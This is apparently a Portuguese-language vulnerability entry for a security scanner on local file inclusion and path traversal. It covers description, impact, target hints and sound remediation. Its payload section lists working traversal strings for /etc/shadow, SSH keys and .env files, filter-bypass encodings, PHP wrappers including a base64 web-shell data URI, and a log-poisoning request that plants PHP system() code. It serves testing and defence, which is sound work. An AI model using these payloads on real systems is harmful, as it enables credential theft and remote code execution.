---
id: lfi
title: "Local File Inclusion / Path Traversal"
module: "lfi"
severity: "HIGH"
cwe_id: "CWE-22"
cwe_title: "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
cvss_vector: "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
vrt_id: "server_security_misconfiguration.path_traversal"
---

## Summary
Parâmetros que controlam caminhos de arquivo permitem escapar do diretório permitido e ler, incluir ou executar arquivos locais, expondo segredos e, em alguns casos, levando a RCE.

## Description
LFI/path traversal ocorre quando a aplicação usa entrada do usuário em operações de arquivo (`include`, `require`, `readFile`, `FileInputStream`, `sendFile`, `template`) sem canonicalizar e validar o caminho. O atacante usa `../` e variações codificadas para sair do diretório base.

Variantes:
- **Path traversal:** leitura de `/etc/passwd`, `.env`, chaves SSH, configurações.
- **LFI:** inclusão de arquivo local em PHP/Java/Python, podendo executar código se o arquivo contiver PHP/script.
- **Log poisoning:** injetar código em logs e incluí-los via LFI.
- **PHP wrappers:** `php://filter`, `php://input`, `data://`, `expect://`.
- **Conversão de arquivos:** SVG/avatar/PDF que processa caminhos internos.
- **Arquivos temporários/uploads:** combinar upload + LFI para RCE.

## Impact
- Leitura de segredos: `.env`, `config.php`, chaves, credenciais de banco/cloud.
- Exfiltração de código-fonte e dados de usuários.
- RCE quando há inclusão de código ou wrappers.
- Movimento lateral e comprometimento do host.
- Impacto HIGH; CRITICAL com RCE.

## Payloads and Bypasses
```text
# Travessia básica
../../../../etc/passwd
../../../../etc/shadow
../../../../etc/hostname
../../../../proc/self/environ
../../../../home/user/.ssh/id_rsa
../../../../var/www/html/.env
../../../../app/config/database.yml

# Variações de encoding
..%2f..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%252f%2e%2e%252fetc%252fpasswd
..%252f..%252f..%252fetc%252fpasswd
..%c0%af..%c0%afetc/passwd
..%5c..%5c..%5cwindows%5cwin.ini
....//....//....//etc/passwd
..././..././..././etc/passwd
..;/..;/..;/etc/passwd

# Null byte (PHP antigo)
../../../../etc/passwd%00
../../../../etc/passwd%00.jpg

# Wrappers PHP
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=../config.php
php://input
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==
expect://id
zip://uploads/avatar.zip%23shell.php
phar://uploads/avatar.phar/shell.php

# Log poisoning
../../../../var/log/apache2/access.log
../../../../var/log/nginx/access.log
../../../../proc/self/fd/2
```

Payloads de log poisoning (enviar no User-Agent):
```http
GET /?file=../../../../var/log/apache2/access.log HTTP/1.1
Host: alvo.com
User-Agent: <?php system($_GET['c']); ?>
```

```text
# Windows
..\..\..\..\windows\win.ini
..%5c..%5c..%5cwindows%5cwin.ini
C:\Windows\System32\drivers\etc\hosts
```

Bypasses de filtros:
```text
- Dupla codificação (%252e%252e%252f)
- Unicode/overlong (%c0%ae%c0%ae/)
- Separatórios alternativos (..\)
- Prefixo permitido + traversal (uploads/../../etc/passwd)
- Remover extensão obrigatória com null byte
- Wrappers e phar
- Inclusão de arquivo temporário enviado por upload
- Path truncation em sistemas antigos
```

Casos reais e mentalidade de ataque (RWBH): Yahoo e Uber (downloads/templates) mostram leitura de arquivos e log poisoning; o atacante testa `../`, wrappers PHP, upload + LFI e caminhos absolutos.

## Target Context (Crawler Hints)
- **Parâmetros comuns:** `file`, `path`, `page`, `template`, `lang`, `locale`, `include`, `require`, `view`, `doc`, `folder`, `download`, `filename`, `image`, `attachment`, `module`, `theme`, `layout`.
- **Paths comuns:** `/download`, `/file`, `/view`, `/include`, `/template`, `/locale`, `/lang`, `/export`, `/attachment`, `/image`, `/api/files`, `/render`.
- **Sinais:** parâmetro com nome de arquivo; erro "No such file"; resposta com conteúdo de arquivo; `Content-Disposition`; upload + visualização.

## Recommendation
1. Não usar entrada do usuário diretamente em caminhos. Mapear IDs/chaves para arquivos em allowlist server-side.
2. Canonicalizar o caminho (`realpath`, `Path.toRealPath`) e verificar se permanece dentro do diretório base.
3. Rejeitar `..`, separadores alternativos, bytes nulos e caracteres de controle após decodificação.
4. Usar allowlist de extensões e nomes; nunca permitir caminhos absolutos.
5. Desabilitar wrappers perigosos (`allow_url_include=Off`, `expect` desabilitado) e restringir `open_basedir` no PHP.
6. Executar o serviço de arquivos em sandbox/chroot, com filesystem read-only e sem segredos.
7. Servir downloads por URLs assinadas e objetos de storage, não por path direto.
8. Exemplo Java:
```java
Path base = Path.of("/srv/app/files").toRealPath();
Path requested = base.resolve(userInput).normalize().toRealPath();
if (!requested.startsWith(base)) throw new SecurityException("path traversal");
if (!Files.isRegularFile(requested)) throw new NotFoundException();
```
9. Monitorar tentativas com `../`, `%2e%2e`, wrappers e acessos a `/etc/passwd`; alertar.
